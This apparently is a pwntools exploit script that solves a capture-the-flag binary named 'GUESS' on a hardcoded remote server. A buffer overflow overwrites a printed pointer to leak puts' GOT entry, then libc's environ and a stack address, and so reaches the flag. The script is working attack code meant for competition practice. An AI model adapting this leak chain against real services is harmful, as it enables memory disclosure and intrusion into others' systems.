from pwn import *
from ctypes import *
import os
#import roputils as rop

remote_addr = "116.62.152.176"
remote_port = 20001

local_addr = "127.0.0.1"
local_port = 1807

pc = "./GUESS"
pwn_elf = ELF(pc)
pwn_rop = rop.ROP(pc)

uselibc = 2 #0 for no,1 for i386,2 for x64
local = 1
haslibc = 1
atta = 1

if uselibc == 2:
	context.arch = "amd64"
else:
	context.arch = "i386"

if uselibc ==2 and haslibc == 0:
	libc = ELF("/lib/x86_64-linux-gnu/libc-2.23.so")
else:
	if uselibc == 1 and haslibc == 0:
		libc = ELF('/lib/i386-linux-gnu/libc-2.23.so')
	else:
		libc = ELF('./libc.so.6')

if local == 1:
	if haslibc:
		p = process(pc,env={'LD_PRELOAD':'./libc.so.6'})
	else:
		p = process(pc)
elif local == 0:
	p = remote(remote_addr,remote_port)
	if haslibc:
		libc = ELF('./libc.so.6')
else:
	p = remote(local_addr,local_port)
	if haslibc:
		libc = ELF('./libc.so.6')

context.log_level = True

if local:
	if atta:
		gdb.attach(p,'b *0x0000000000400B28\n')


def sla(a,b):
	p.sendlineafter(a,b)

def sa(a,b):
	p.sendafter(a,b)

def ru(a):
	p.recvuntil(a)

def rv(a):
	return p.recv(a)


def lg(s,addr):
	print('\033[1;31;40m%20s-->0x%x\033[0m'%(s,addr))

def hack():
	raw_input()
	puts_got = pwn_elf.got['puts']
	payload = 'A'*0x128 + p64(puts_got)
	sla('flag',payload)
	ru(': ')
	puts_addr = u64(rv(6).ljust(8,'\x00'))
	lg('puts_addr',puts_addr)
	libc.address = puts_addr - libc.symbols['puts']
	lg('libc.address',libc.address)
	io_list_all = libc.address + 0x3c5520

	environ = libc.symbols['environ']
	payload = 'A'*0x128 + p64(environ)
	sla('flag',payload)
	ru(': ')
	stack_addr = u64(rv(6).ljust(8,'\x00'))
	lg('stack_addr',stack_addr)

	payload = 'A'*0x128 + p64(stack_addr-0x168)
	sla('flag',payload)
	p.interactive()
hack()